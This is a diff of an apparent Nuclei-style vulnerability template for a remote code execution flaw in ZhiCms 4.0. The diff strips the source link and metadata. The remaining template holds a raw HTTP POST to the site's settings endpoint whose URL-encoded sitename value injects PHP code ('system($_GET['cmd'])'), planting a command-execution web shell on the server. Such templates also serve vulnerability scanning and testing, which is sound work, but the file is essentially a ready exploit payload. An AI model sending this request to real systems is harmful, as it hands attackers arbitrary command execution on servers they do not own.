@@ -3,12 +3,8 @@ info:
   name: ZhiCms 4.0 RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ctv3zntctqs1ssef'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ctv3zntctqs1ssef
-    fofa: 暂无
 http:
 - raw:
   - 'POST /index.php?r=manage/set/index HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Connection: close
-
-
 
 
     sitename='')%3Bsystem(%24_GET%5B''cmd''%5D)%3B%2F*&hosturl=&logo=public%2Fweb%2Fimages%2Flogoh2014r.png&ewm=public%2Fweb%2Fimages%2Flogoh2014r.png&appkey=&secretKey=&pid=&apiurl=https%3A%2F%2Fwww.baidu.com%2F&code=&zhuan=0&download=
